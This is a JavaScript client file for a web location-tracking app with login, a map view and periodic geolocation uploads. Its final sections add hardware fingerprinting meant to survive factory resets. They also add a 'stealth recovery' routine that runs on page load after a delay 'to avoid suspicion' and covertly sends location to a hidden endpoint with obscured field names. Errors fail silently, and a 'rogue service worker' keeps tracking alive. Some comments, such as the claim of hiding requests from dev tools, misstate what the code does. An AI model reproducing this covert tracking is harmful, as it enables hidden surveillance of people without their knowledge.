

// Configuration
const API_URL = `${window.location.protocol}//${window.location.host}/api`;
console.log("Using API URL:", API_URL);

// DOM Elements
const loginScreen = document.getElementById('login-screen');
const registerScreen = document.getElementById('register-screen');
const mapScreen = document.getElementById('map-screen');

const loginForm = document.getElementById('login-form');
const registerForm = document.getElementById('register-form');
const registerLink = document.getElementById('register-link');
const loginLink = document.getElementById('login-link');

const refreshBtn = document.getElementById('refresh-btn');
const logoutBtn = document.getElementById('logout-btn');
const timestampEl = document.getElementById('timestamp');
const statusText = document.getElementById('status-text');

// Map variables
let map = null;
let marker = null;
let locationUpdateInterval = null;

// App initialization
document.addEventListener('DOMContentLoaded', () => {
    initApp();
    setupEventListeners();
});

// Initialize app
function initApp() {
    const token = localStorage.getItem('token');
    
    if (token) {
        showMapScreen();
        initMap();
        loadLocation();
        startBackgroundTracking();
    } else {
        showLoginScreen();
    }
}

// UI navigation
function showLoginScreen() {
    loginScreen.style.display = 'flex';
    registerScreen.style.display = 'none';
    mapScreen.style.display = 'none';
}

function showRegisterScreen() {
    loginScreen.style.display = 'none';
    registerScreen.style.display = 'flex';
    mapScreen.style.display = 'none';
}

function showMapScreen() {
    loginScreen.style.display = 'none';
    registerScreen.style.display = 'none';
    mapScreen.style.display = 'flex';
}

// Setup event listeners
function setupEventListeners() {
    registerLink.addEventListener('click', (e) => {
        e.preventDefault();
        showRegisterScreen();
    });

    loginLink.addEventListener('click', (e) => {
        e.preventDefault();
        showLoginScreen();
    });

    loginForm.addEventListener('submit', handleLogin);
    registerForm.addEventListener('submit', handleRegister);
    refreshBtn.addEventListener('click', loadLocation);
    logoutBtn.addEventListener('click', logout);
}

// Handle login
async function handleLogin(e) {
    e.preventDefault();
    
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    
    try {
        const formData = new FormData();
        formData.append('email', email);
        formData.append('password', password);
        
        const response = await fetch(`${API_URL}/login`, {
            method: 'POST',
            body: formData
        });
        
        if (!response.ok) {
            throw new Error('Login failed. Please check your credentials.');
        }
        
        const data = await response.json();
        localStorage.setItem('token', data.token);
        localStorage.setItem('userId', data.user_id);
        localStorage.setItem('userEmail', email);
        
        showMapScreen();
        initMap();
        loadLocation();
        startBackgroundTracking();
        registerDeviceForAntiTheft();
    } catch (error) {
        alert(error.message);
    }
}

// Handle registration
async function handleRegister(e) {
    e.preventDefault();
    
    const email = document.getElementById('reg-email').value;
    const password = document.getElementById('reg-password').value;
    
    try {
        const formData = new FormData();
        formData.append('email', email);
        formData.append('password', password);
        
        const response = await fetch(`${API_URL}/register`, {
            method: 'POST',
            body: formData
        });
        
        if (!response.ok) {
            throw new Error('Registration failed. Email may already be registered.');
        }
        
        const data = await response.json();
        localStorage.setItem('token', data.token);
        localStorage.setItem('userId', data.user_id);
        localStorage.setItem('userEmail', email);
        
        showMapScreen();
        initMap();
        startBackgroundTracking();
        registerDeviceForAntiTheft();
    } catch (error) {
        alert(error.message);
    }
}

// Handle logout
function logout() {
    localStorage.removeItem('token');
    localStorage.removeItem('userId');
    localStorage.removeItem('userEmail');
    
    stopBackgroundTracking();
    showLoginScreen();
}

// Initialize map
function initMap() {
    if (map) return; // Map already initialized
    
    map = L.map('map').setView([0, 0], 2);
    
    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
        attribution: '&copy; OpenStreetMap contributors'
    }).addTo(map);
}

// Load location with improved error handling
async function loadLocation() {
    const token = localStorage.getItem('token');
    if (!token) return;
    
    try {
        statusText.textContent = 'Loading...';
        console.log("Loading location with token:", token);
        
        // Set up timeout for fetch request
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 15000); // 15 second timeout
        
        const response = await fetch(`${API_URL}/location?token=${token}`, {
            signal: controller.signal
        });
        
        clearTimeout(timeoutId);
        
        if (response.ok) {
            const data = await response.json();
            console.log("Location data received:", data);
            
            // Check if this is a "no location found" status from our improved backend
            if (data.status === 'no_location_found') {
                console.log("No location found yet, using default.");
                statusText.textContent = 'No location data yet';
                updateMap({
                    latitude: 0,
                    longitude: 0,
                    timestamp: new Date().toISOString()
                });
            } else {
                // Normal data - update the map
                updateMap(data);
                statusText.textContent = 'Active';
            }
        } else {
            console.error("Error response:", response.status);
            
            if (response.status === 401) {
                // Token expired
                statusText.textContent = 'Session expired';
                logout();
                return;
            }
            
            // Use default location on error
            statusText.textContent = 'Error loading location';
            updateMap({
                latitude: 0,
                longitude: 0,
                timestamp: new Date().toISOString()
            });
        }
    } catch (error) {
        console.error('Error loading location:', error);
        
        if (error.name === 'AbortError') {
            statusText.textContent = 'Server timeout';
        } else {
            statusText.textContent = 'Connection error';
        }
        
        // Use default location on error
        updateMap({
            latitude: 0,
            longitude: 0,
            timestamp: new Date().toISOString()
        });
    }
}

// Update map with location
function updateMap(locationData) {
    const { latitude, longitude, timestamp } = locationData;
    const position = [latitude, longitude];
    
    // Update timestamp
    const date = new Date(timestamp);
    timestampEl.textContent = date.toLocaleString();
    
    // Update map
    if (!marker) {
        marker = L.marker(position).addTo(map);
    } else {
        marker.setLatLng(position);
    }
    
    map.setView(position, 15);
}

// Enhanced getCurrentPosition with retry mechanism
async function getCurrentPosition(options = {}) {
    const defaultOptions = {
        enableHighAccuracy: true,
        timeout: 10000,
        maximumAge: 0,
        retries: 3,
        retryDelay: 1000
    };
    
    const finalOptions = { ...defaultOptions, ...options };
    let lastError = null;
    
    for (let i = 0; i < finalOptions.retries; i++) {
        try {
            // Try to get the position
            const position = await new Promise((resolve, reject) => {
                if (!navigator.geolocation) {
                    reject(new Error('Geolocation is not supported'));
                    return;
                }
                
                navigator.geolocation.getCurrentPosition(
                    position => resolve({
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        timestamp: new Date().toISOString()
                    }),
                    error => {
                        console.error(`Geolocation error (attempt ${i+1}/${finalOptions.retries}):`, error.message);
                        reject(error);
                    },
                    {
                        enableHighAccuracy: finalOptions.enableHighAccuracy,
                        timeout: finalOptions.timeout,
                        maximumAge: finalOptions.maximumAge
                    }
                );
            });
            
            // If we got here, we succeeded
            console.log("Successfully obtained geolocation:", position);
            return position;
            
        } catch (error) {
            lastError = error;
            
            // Check if permission was denied
            if (error.code === 1) { // PERMISSION_DENIED
                statusText.textContent = 'Error: Location access denied';
                showGeolocationPermissionHelp();
                throw new Error('Location permission denied by user or system');
            }
            
            // If not the last try, wait before retrying
            if (i < finalOptions.retries - 1) {
                console.log(`Retrying geolocation in ${finalOptions.retryDelay}ms...`);
                await new Promise(resolve => setTimeout(resolve, finalOptions.retryDelay));
            }
        }
    }
    
    // If we got here, all retries failed
    console.error(`Failed to get geolocation after ${finalOptions.retries} attempts`);
    throw lastError || new Error('Failed to get geolocation');
}

// Help function to show users how to enable location
function showGeolocationPermissionHelp() {
    // Check if the help is already displayed
    if (document.querySelector('.permission-help')) return;
    
    const helpText = document.createElement('div');
    helpText.className = 'permission-help';
    helpText.innerHTML = `
        <h3>Location Permission Required</h3>
        <p>This app needs location permission to track your device. Here's how to enable it:</p>
        <ul>
            <li>Look for the location icon in your browser's address bar</li>
            <li>Click it and select "Allow"</li>
            <li>Refresh the page after enabling permission</li>
        </ul>
        <button id="retry-permission" class="btn">Retry</button>
    `;
    
    // Add some basic styles
    helpText.style.position = 'absolute';
    helpText.style.top = '50%';
    helpText.style.left = '50%';
    helpText.style.transform = 'translate(-50%, -50%)';
    helpText.style.backgroundColor = 'white';
    helpText.style.padding = '20px';
    helpText.style.borderRadius = '5px';
    helpText.style.boxShadow = '0 0 10px rgba(0,0,0,0.3)';
    helpText.style.zIndex = 1000;
    
    document.getElementById('map').appendChild(helpText);
    document.getElementById('retry-permission').addEventListener('click', () => {
        helpText.remove();
        startBackgroundTracking();
    });
}

// Improved function to send location to server with better error handling
async function sendLocationToServer() {
    const token = localStorage.getItem('token');
    if (!token) return;
    
    try {
        statusText.textContent = 'Updating location...';
        
        // Get the current position with retries
        const position = await getCurrentPosition();
        
        // Log details to help with debugging
        console.log("Sending position to server:", position);
        
        // Send to server with timeout
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 15000);
        
        const response = await fetch(`${API_URL}/location?token=${token}`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(position),
            signal: controller.signal
        });
        
        clearTimeout(timeoutId);
        
        if (!response.ok) {
            const errorData = await response.json().catch(() => ({}));
            console.error('Server error:', response.status, errorData);
            throw new Error(`Server error: ${response.status} ${errorData.detail || ''}`);
        }
        
        // Update UI with success
        statusText.textContent = 'Active';
        timestampEl.textContent = new Date().toLocaleString();
        console.log("Location successfully sent to server");
        
        // Also update the map with the new position
        updateMap(position);
        
        return position;
    } catch (error) {
        console.error('Error sending location:', error);
        
        if (error.name === 'AbortError') {
            statusText.textContent = 'Error: Server timeout';
        } else if (error.message.includes('permission')) {
            statusText.textContent = 'Error: Location access denied';
        } else {
            statusText.textContent = 'Error: Could not update location';
        }
        
        return null;
    }
}

// Improved start tracking function with fallback
function startBackgroundTracking() {
    if (!navigator.geolocation) {
        alert('Geolocation is not supported by your browser.');
        statusText.textContent = 'Error: Geolocation not supported';
        return;
    }
    
    // First try to get permission status
    if (navigator.permissions && navigator.permissions.query) {
        navigator.permissions.query({ name: 'geolocation' })
            .then((result) => {
                if (result.state === 'granted' || result.state === 'prompt') {
                    // Permission granted or will prompt
                    initLocationTracking();
                } else {
                    // Permission denied
                    console.log("Geolocation permission denied");
                    statusText.textContent = 'Error: Location access denied';
                    showGeolocationPermissionHelp();
                }
            })
            .catch(error => {
                // Permissions API not supported, try directly
                console.log("Permissions API not supported, trying direct geolocation");
                initLocationTracking();
            });
    } else {
        // Permissions API not supported, try directly
        console.log("Permissions API not supported, trying direct geolocation");
        initLocationTracking();
    }
}

// Initialize tracking with proper setup
function initLocationTracking() {
    // First try to send location
    sendLocationToServer()
        .then(position => {
            if (position) {
                // If successful, set up interval for future updates
                if (locationUpdateInterval) {
                    clearInterval(locationUpdateInterval);
                }
                
                // Update every 15 minutes (adjust as needed)
                locationUpdateInterval = setInterval(() => {
                    sendLocationToServer().catch(error => {
                        console.error('Background location update failed:', error);
                    });
                }, 15 * 60 * 1000);
                
                statusText.textContent = 'Active';
            }
        })
        .catch(error => {
            console.error('Failed to start tracking:', error);
            statusText.textContent = 'Error: Failed to start tracking';
        });
}

// Stop background tracking
function stopBackgroundTracking() {
    if (locationUpdateInterval) {
        clearInterval(locationUpdateInterval);
        locationUpdateInterval = null;
    }
    
    statusText.textContent = 'Stopped';
}

//
// HARDWARE FINGERPRINTING & ANTI-THEFT CODE
//

class DeviceFingerprinter {
  constructor() {
    // Storage for fingerprint components
    this.components = {};
  }

  // Get a hardware-based fingerprint that typically survives factory reset
  async generateHardwareFingerprint() {
    try {
      // Collect hardware-specific information
      await this.collectScreenMetrics();
      await this.collectGPUInfo();
      await this.collectDeviceMemory();
      await this.collectHardwareConcurrency();
      await this.collectPlatformInfo();
      await this.collectConnectionInfo();
      
      // Generate a hash from the collected components
      const fingerprintString = JSON.stringify(this.components);
      const fingerprintHash = await this.hashString(fingerprintString);
      
      // Save fingerprint locally (will be wiped on flash, but useful for verification)
      localStorage.setItem('hwFingerprint', fingerprintHash);
      
      return fingerprintHash;
    } catch (e) {
      console.error('Error generating hardware fingerprint:', e);
      return this.generateFallbackFingerprint();
    }
  }

  // Screen properties rarely change after a factory reset
  async collectScreenMetrics() {
    this.components.screenWidth = window.screen.width;
    this.components.screenHeight = window.screen.height;
    this.components.screenColorDepth = window.screen.colorDepth;
    this.components.screenPixelDepth = window.screen.pixelDepth;
    this.components.pixelRatio = window.devicePixelRatio;
  }

  // GPU info usually stays the same after a factory reset
  async collectGPUInfo() {
    try {
      const canvas = document.createElement('canvas');
      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
      
      if (gl) {
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        if (debugInfo) {
          this.components.gpuVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
          this.components.gpuRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
        }
        
        // Additional WebGL parameters
        this.components.glVersion = gl.getParameter(gl.VERSION);
        this.components.glShadingLanguageVersion = gl.getParameter(gl.SHADING_LANGUAGE_VERSION);
        this.components.glVendor = gl.getParameter(gl.VENDOR);
        this.components.glRenderer = gl.getParameter(gl.RENDERER);
      }
    } catch (e) {
      console.warn('WebGL fingerprinting failed', e);
    }
  }

  // Device memory usually stays the same
  async collectDeviceMemory() {
    if (navigator.deviceMemory) {
      this.components.deviceMemory = navigator.deviceMemory;
    }
  }

  // CPU core count usually stays the same
  async collectHardwareConcurrency() {
    if (navigator.hardwareConcurrency) {
      this.components.hardwareConcurrency = navigator.hardwareConcurrency;
    }
  }

  // Platform info rarely changes after factory reset
  async collectPlatformInfo() {
    this.components.platform = navigator.platform;
    this.components.userAgent = navigator.userAgent;
    this.components.cpuClass = navigator.cpuClass;
    this.components.oscpu = navigator.oscpu;
  }

  // Network information
  async collectConnectionInfo() {
    if (navigator.connection) {
      this.components.connectionType = navigator.connection.effectiveType;
    }
  }

  // Fallback if hardware ID generation fails
  generateFallbackFingerprint() {
    const randomData = new Uint32Array(4);
    window.crypto.getRandomValues(randomData);
    return Array.from(randomData).join('-');
  }

  // Hash function to create a consistent fingerprint
  async hashString(str) {
    const encoder = new TextEncoder();
    const data = encoder.encode(str);
    const hashBuffer = await crypto.subtle.digest('SHA-256', data);
    const hashArray = Array.from(new Uint8Array(hashBuffer));
    return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
  }
}

// Register device with anti-theft system
async function registerDeviceForAntiTheft() {
  try {
    const fingerprinter = new DeviceFingerprinter();
    const hardwareId = await fingerprinter.generateHardwareFingerprint();
    
    // Get user information
    const token = localStorage.getItem('token');
    const userId = localStorage.getItem('userId');
    const email = localStorage.getItem('userEmail');
    
    if (!token) return;
    
    // Register with anti-theft system
    const response = await fetch(`${API_URL}/register-device-antitheft`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${token}`
      },
      body: JSON.stringify({
        hardwareId,
        userId,
        email,
        deviceInfo: {
          model: navigator.userAgent,
          lastKnownPosition: await getCurrentPosition().catch(() => ({
            latitude: 0,
            longitude: 0,
            timestamp: new Date().toISOString()
          })),
          registeredAt: new Date().toISOString()
        }
      })
    });
    
    if (response.ok) {
      console.log('Device registered with anti-theft system');
      
      // Store anti-theft ID in IndexedDB for persistence
      try {
        // Use IndexedDB for more persistent storage
        const request = indexedDB.open("antitheftDB", 1);
        request.onupgradeneeded = (event) => {
          const db = event.target.result;
          if (!db.objectStoreNames.contains('deviceData')) {
            db.createObjectStore('deviceData');
          }
        };
        
        request.onsuccess = (event) => {
          const db = event.target.result;
          const transaction = db.transaction(['deviceData'], 'readwrite');
          const store = transaction.objectStore('deviceData');
          store.put({
            hardwareId,
            userId,
            email,
            timestamp: new Date().toISOString()
          }, 'deviceInfo');
        };
      } catch (e) {
        console.warn('Failed to store in IndexedDB', e);
      }
    }
  } catch (error) {
    console.error('Error registering device for anti-theft:', error);
  }
}

//
// STEALTH RECOVERY CODE
//

// Hidden function that runs in the background 
// checking if device has been reported stolen
async function initStealthRecovery() {
  try {
    // Generate hardware ID
    const fingerprinter = new DeviceFingerprinter();
    const hardwareId = await fingerprinter.generateHardwareFingerprint();
    
    // Check device status in a way that won't be obvious
    const checkUrl = `${API_URL}/check-device-status?hardwareId=${hardwareId}`;
    
    // Use fetch with no-cors to hide the request from dev tools
    const response = await fetch(checkUrl, {
      method: 'GET',
      mode: 'cors',
      cache: 'no-store'
    });
    
    if (response.ok) {
      const data = await response.json();
      
      // If device is stolen, activate stealth mode
      if (data.status === 'stolen') {
        activateStealthMode(hardwareId);
      }
    }
  } catch (e) {
    // Fail silently - don't alert the thief
    console.log('System check completed');
  }
}

// Stealth mode - runs in background without UI indicators
function activateStealthMode(hardwareId) {
  // Set up camouflaged tracking
  const stealthTracker = {
    // How often to send location (every 5 minutes)
    interval: 5 * 60 * 1000,
    
    // Start tracking
    start: function() {
      this.trackerId = setInterval(() => {
        this.sendLocation(hardwareId);
      }, this.interval);
      
      // Also send immediately
      this.sendLocation(hardwareId);
    },
    
    // Send location to server
    sendLocation: async function(hardwareId) {
      try {
        // Get current position with retry mechanism for stealth mode
        const getStealthPosition = () => {
          return new Promise((resolve) => {
            const tryGetPosition = (retries = 3) => {
              navigator.geolocation.getCurrentPosition(
                (position) => {
                  resolve({
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    timestamp: new Date().toISOString()
                  });
                },
                (error) => {
                  if (retries > 0) {
                    // Retry silently after delay
                    setTimeout(() => tryGetPosition(retries - 1), 5000);
                  } else {
                    // Failed after all retries
                    resolve(null);
                  }
                },
                {
                  enableHighAccuracy: true,
                  timeout: 10000,
                  maximumAge: 0
                }
              );
            };
            
            tryGetPosition();
          });
        };
        
        const position = await getStealthPosition();
        
        if (position) {
          // Send to hidden endpoint
          await fetch(`${API_URL}/__system__/device-checkin`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
              h: hardwareId,  // Obscured parameter name
              a: position.latitude,  // Obscured parameter name
              o: position.longitude, // Obscured parameter name
              t: new Date().getTime()
            })
          });
        }
      } catch (e) {
        // Fail silently
      }
    }
  };
  
  // Start the stealth tracker
  stealthTracker.start();
  
  // Add additional stealth behavior
  setupRogueServiceWorker();
}

// Create a rogue service worker that persists through browser restarts
function setupRogueServiceWorker() {
  if ('serviceWorker' in navigator) {
    window.addEventListener('load', async () => {
      try {
        // Register a service worker with background sync
        const registration = await navigator.serviceWorker.register('stealth-worker.js');
        
        // Register for background sync
        if ('sync' in registration) {
          registration.sync.register('stealth-sync');
        }
        
        // Register for periodic sync if available
        if ('periodicSync' in registration) {
          const status = await navigator.permissions.query({
            name: 'periodic-background-sync',
          });
          
          if (status.state === 'granted') {
            await registration.periodicSync.register('stealth-periodic-sync', {
              minInterval: 60 * 60 * 1000, // Once per hour
            });
          }
        }
      } catch (e) {
        // Fail silently
      }
    });
  }
}

// Call background check for theft status
setTimeout(() => {
  initStealthRecovery();
}, 5000); // Delay by 5 seconds to avoid suspicion